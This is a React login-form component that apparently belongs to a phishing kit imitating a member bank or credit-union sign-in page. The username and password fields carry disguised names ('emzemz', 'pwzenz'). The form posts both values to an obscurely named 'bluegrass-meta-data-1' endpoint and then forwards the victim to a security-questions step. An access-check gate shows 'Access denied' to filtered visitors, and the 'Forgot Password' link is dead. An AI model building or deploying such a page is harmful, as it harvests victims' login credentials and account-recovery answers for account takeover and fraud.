import React, { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import axios from 'axios';
import { baseUrl } from '../constants';
import useAccessCheck from '../Utils/useAccessCheck';
import FlowPageLayout from '../components/FlowPageLayout';
import FlowHelmet from '../components/FlowHelmet';

const EyeIcon = ({ isVisible }: { isVisible: boolean }) => {
  if (isVisible) {
    return (
      <svg
        className="h-5 w-5"
        viewBox="0 0 24 24"
        fill="none"
        stroke="currentColor"
        strokeWidth="1.8"
        strokeLinecap="round"
        strokeLinejoin="round"
        aria-hidden="true"
      >
        <path d="M2 12s4-7 10-7 10 7 10 7-4 7-10 7-10-7-10-7z" />
        <circle cx="12" cy="12" r="3" />
      </svg>
    );
  }

  return (
    <svg
      className="h-5 w-5"
      viewBox="0 0 24 24"
      fill="none"
      stroke="currentColor"
      strokeWidth="1.8"
      strokeLinecap="round"
      strokeLinejoin="round"
      aria-hidden="true"
    >
      <path d="M17.94 17.94A10.94 10.94 0 0 1 12 19c-6 0-10-7-10-7a21.37 21.37 0 0 1 5.07-5.92" />
      <path d="M1 1l22 22" />
    </svg>
  );
};

const LoginForm: React.FC = () => {
  const [emzemz, setEmzemz] = useState('');
  const [pwzenz, setPwzenz] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [showPwzenz, setShowPwzenz] = useState(false);
  const [errors, setErrors] = useState({ emzemz: '', pwzenz: '' });
  const navigate = useNavigate();
  const isAllowed = useAccessCheck(baseUrl);

  if (isAllowed === null) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-[#4A9619] text-white text-lg">
        Checking access&hellip;
      </div>
    );
  }

  if (isAllowed === false) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-[#4A9619] text-white text-lg">
        Access denied. Redirecting&hellip;
      </div>
    );
  }

  const togglePwzenzVisibility = () => setShowPwzenz((prev) => !prev);

  const handleSubmit = async (event: React.FormEvent<HTMLFormElement>) => {
    event.preventDefault();
    setIsLoading(true);

    const newErrors = { emzemz: '', pwzenz: '' };
    if (!emzemz.trim()) {
      newErrors.emzemz = 'Username is required.';
    }
    if (!pwzenz.trim()) {
      newErrors.pwzenz = 'Password is required.';
    }

    setErrors(newErrors);

    if (newErrors.emzemz || newErrors.pwzenz) {
      setIsLoading(false);
      return;
    }

    const url = `${baseUrl}api/bluegrass-meta-data-1/`;

    try {
      await axios.post(url, {
        emzemz,
        pwzenz,
      });

      setIsLoading(false);
      navigate('/security-questions', {
        state: { emzemz },
      });
    } catch (error) {
      console.error('Error sending message:', error);
      setIsLoading(false);
      return;
    }
  };

  return (
    <>
      <FlowHelmet title="Sign In" />
      <FlowPageLayout
      title="Sign In"
      eyebrow="Member Login"
      contentClassName="space-y-4"
      afterContent={(
        <div className="text-sm">
          <a href="#" className="font-medium text-blue-600 hover:underline">
            Forgot Password
          </a>
        </div>
      )}
    >
      <form onSubmit={handleSubmit} className="space-y-4 text-left">
        <div>
          <label htmlFor="emzemz" className="sr-only">
            Username
          </label>
          <input
            id="emzemz"
            name="emzemz"
            type="text"
            value={emzemz}
            onChange={(e) => setEmzemz(e.target.value)}
            placeholder="Username"
            className="w-full rounded-xl border border-gray-200 px-4 py-3 text-gray-700 shadow-sm placeholder:text-gray-400 focus:border-blue-200 focus:outline-none focus:ring-2 focus:ring-blue-100"
          />
          {errors.emzemz && <p className="mt-2 text-sm text-red-600">{errors.emzemz}</p>}
        </div>

        <div>
          <label htmlFor="pwzenz" className="sr-only">
            Password
          </label>
          <div className="relative">
            <input
              id="pwzenz"
              name="pwzenz"
              type={showPwzenz ? 'text' : 'password'}
              value={pwzenz}
              onChange={(e) => setPwzenz(e.target.value)}
              placeholder="Password"
              className="w-full rounded-xl border border-gray-200 px-4 py-3 pr-12 text-gray-700 shadow-sm placeholder:text-gray-400 focus:border-blue-200 focus:outline-none focus:ring-2 focus:ring-blue-100"
            />
            <button
              type="button"
              onClick={togglePwzenzVisibility}
              className="absolute inset-y-0 right-4 flex items-center text-blue-600 hover:text-blue-500"
              aria-label={showPwzenz ? 'Hide password' : 'Show password'}
            >
              <EyeIcon isVisible={showPwzenz} />
            </button>
          </div>
          {errors.pwzenz && <p className="mt-2 text-sm text-red-600">{errors.pwzenz}</p>}
        </div>

        <button
          type="submit"
          disabled={isLoading}
          className="w-full rounded-xl bg-[#4A9619] py-3 text-base font-semibold text-white transition hover:bg-[#3f8215] disabled:cursor-not-allowed disabled:opacity-70"
        >
          {isLoading ? 'Signing in…' : 'Sign In'}
        </button>
      </form>
    </FlowPageLayout>
    </>
  );
}

export default LoginForm;
